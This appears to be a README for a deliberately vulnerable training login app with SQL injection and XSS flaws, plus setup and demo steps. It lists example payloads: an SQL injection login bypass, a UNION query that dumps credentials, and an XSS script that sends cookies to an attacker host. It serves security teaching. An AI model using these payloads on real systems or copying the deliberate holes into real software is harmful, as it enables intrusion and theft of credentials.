# Login Demo - Vulnerability Demonstration

## Project Purpose

This project is an educational tool designed to demonstrate common web application vulnerabilities, specifically SQL Injection (SQLi) and Cross-Site Scripting (XSS). It provides two versions of the same login application:

1. A **dev** version with multiple vulnerabilities
2. A **stable** version with some vulnerabilities fixed

Use this application in controlled environments only, such as classroom demonstrations, workshops, or educational events about web security.

## Technologies Used

- **Backend**: Node.js with Express
- **Database**: PostgreSQL
- **Containerization**: Docker and Docker Compose
- **Frontend**: Simple HTML

## Versions and Vulnerabilities

### Dev Version (Port 3000)

The development version contains the following vulnerabilities and bugs:

1. **SQL Injection**: Directly concatenates user input into SQL queries
2. **Cross-Site Scripting (XSS)**: Reflects unsanitized user input in the response HTML
3. **Password Validation Bugs**:
   - Incorrect length validation (requires 6-10 characters instead of the intended 5-10)
   - Missing lowercase letter validation
   - Allows single and double quotes in passwords

### Stable Version (Port 3001)

The stable version has improved security but still contains intentional vulnerabilities:

1. **SQL Injection**: FIXED - Uses parameterized queries to prevent SQLi
2. **Cross-Site Scripting (XSS)**: Still vulnerable - continues to reflect unsanitized user input
3. **Password Validation Bugs**: FIXED - Correctly validates passwords according to rules:
   - 5-10 characters length
   - At least one uppercase letter
   - At least one lowercase letter
   - At least one number
   - Only alphanumeric characters

## Example Payloads

### SQL Injection (Dev Version Only)

#### Basic Authentication Bypass
```
' OR '1'='1' --
```

#### Extracting Database Credentials
```
' UNION SELECT id, username, password FROM users --
```

This payload will extract all usernames and passwords from the database. The application will log the extracted data to the console.

### XSS (Both Versions)

#### Simple Alert
```html
<script>alert('XSS Vulnerability!')</script>
```

#### More Advanced Example
```html
<img src="x" onerror="alert(document.cookie)">
```

#### Data Exfiltration (Conceptual)
```html
<script>
  fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
```

## Running the Application

### Prerequisites

- Docker and Docker Compose installed
- Git to clone the repository

### Setup and Run

1. **Clone the repository:**
   ```bash
   git clone https://github.com/your-username/login-demo-qtm.git
   cd login-demo-qtm
   ```

2. **Create a .env file with the following content:**
   ```
   POSTGRES_USER=postgres
   POSTGRES_PASSWORD=postgres
   POSTGRES_DB=login_demo
   DB_PORT=5432
   PORT=3000
   ```

3. **Build and start the containers:**
   ```bash
   docker-compose up --build
   ```

4. **Access the applications:**
   - Dev version (SQLi + XSS): http://localhost:3000
   - Stable version (XSS only): http://localhost:3001

5. **Stop the application:**
   ```bash
   # Press Ctrl+C in the terminal where docker-compose is running
   docker-compose down
   ```

## Demo Instructions

### SQL Injection Demo (Dev Version)

1. Go to http://localhost:3000
2. Enter the payload `' UNION SELECT id, username, password FROM users --` in the username field
3. Enter any text in the password field
4. Submit the form
5. Check the server logs to see the credentials extracted from the database

### XSS Demo (Both Versions)

#### For Dev Version
1. Go to http://localhost:3000
2. Enter a valid username/password combination
3. Notice the alert when successfully logged in

#### For Stable Version
1. Create a user with a malicious script as the username (requires direct database access)
2. Go to http://localhost:3001
3. Log in with that username and its password
4. Notice the alert when successfully logged in

## Security Warning

This application is intentionally vulnerable and should NEVER be deployed in a production environment or exposed to the public internet. It is designed solely for educational purposes in a controlled environment.